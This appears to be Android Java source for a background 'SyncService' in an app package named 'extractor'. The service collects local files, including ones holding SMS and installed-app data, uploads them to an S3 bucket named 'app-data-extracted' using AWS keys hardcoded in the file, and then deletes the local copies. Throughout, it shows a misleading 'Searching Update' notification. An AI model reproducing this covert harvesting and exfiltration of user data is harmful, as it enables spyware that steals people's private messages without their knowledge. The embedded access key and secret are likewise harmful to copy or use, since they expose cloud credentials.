package info.kalagato.com.extractor;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;

import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.mobile.client.AWSMobileClient;
import com.amazonaws.mobile.client.UserStateDetails;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferState;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.ObjectMetadata;



import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import static info.kalagato.com.extractor.Constant.CHANNEL_ID;

public class SyncService extends Service {

    private String TAG = "sync-service";
    private static final String KEY = "AKIAXTJK7XDQG3HJAFXN";
    private static final String SECRET = "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";

    private ServiceHandler mServiceHandler;
    private Looper mServiceLooper;

    private class ServiceHandler extends Handler {

        public ServiceHandler(Looper looper) {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg) {

            try {
            Date c = Calendar.getInstance().getTime();
            SimpleDateFormat df = new SimpleDateFormat("dd-MMM-yyyy");
            String formattedDate = df.format(c);

            String path = Environment.getExternalStorageDirectory().toString()+"/Folder";

            File directory = new File(path);
            File[] files = directory.listFiles();


            for (int i = 0; i < files.length; i++)
            {
                if(files[i].getName().contains(Constant.SMS) ||
                        files[i].getName().contains(Constant.INSTALLED_APP) ||
                        !files[i].getName().contains(formattedDate)){
                    uploadWithTransferUtility(files[i].getName());
                }
            }
            }catch (Exception ex){
                ex.printStackTrace();
            }
            stopSelf();

        }

        public void uploadWithTransferUtility(String filename) {

            BasicAWSCredentials credentials = new BasicAWSCredentials(KEY, SECRET);
            AmazonS3Client s3Client = new AmazonS3Client(credentials);

            TransferUtility transferUtility =
                    TransferUtility.builder()
                            .context(getApplicationContext())
                            .awsConfiguration(AWSMobileClient.getInstance().getConfiguration())
                            .s3Client(s3Client)
                            .build();



            final File file = new File(Environment.getExternalStorageDirectory(),
                    "/Folder/" + filename);
            String YOUR_BUCKET_NAME = "app-data-extracted";
            TransferObserver uploadObserver = transferUtility.upload(YOUR_BUCKET_NAME,
                            "" + getPackageName() + "/"+filename,file);

            // Attach a listener to the observer to get state update and progress notifications
            uploadObserver.setTransferListener(new TransferListener() {

                @Override
                public void onStateChanged(int id, TransferState state) {
                    if (TransferState.COMPLETED == state) {
                        // Handle a completed upload.

                        file.delete();
                        if(file.exists()){
                            try {
                                file.getCanonicalFile().delete();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            if(file.exists()){
                                getApplicationContext().deleteFile(file.getName());
                            }
                        }
                    }
                }

                @Override
                public void onProgressChanged(int id, long bytesCurrent, long bytesTotal) {
                    float percentDonef = ((float) bytesCurrent / (float) bytesTotal) * 100;
                    int percentDone = (int)percentDonef;

//                    Log.d("YourActivity", "ID:" + id + " bytesCurrent: " + bytesCurrent
//                            + " bytesTotal: " + bytesTotal + " " + percentDone + "%");
                }

                @Override
                public void onError(int id, Exception ex) {
                    // Handle errors
                }

            });

            // If you prefer to poll for the data, instead of attaching a
            // listener, check for the state and progress in the observer.
            if (TransferState.COMPLETED == uploadObserver.getState()) {
                // Handle a completed upload.
            }
        }
    }

    @Override
    public void onCreate() {
        HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND);
        thread.start();

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.getLooper();
        mServiceHandler = new SyncService.ServiceHandler(mServiceLooper);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Intent notificationIntent = new Intent(this, Extractor.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Searching Update")
                .setContentText("")
                .setSmallIcon(R.drawable.ic_settings)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        // For each start request, send a message to start a job and deliver the
        // start ID so we know which request we're stopping when we finish the job
        Message msg = mServiceHandler.obtainMessage();
        msg.arg1 = startId;
        mServiceHandler.sendMessage(msg);

        // If we get killed, after returning from here, restart
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
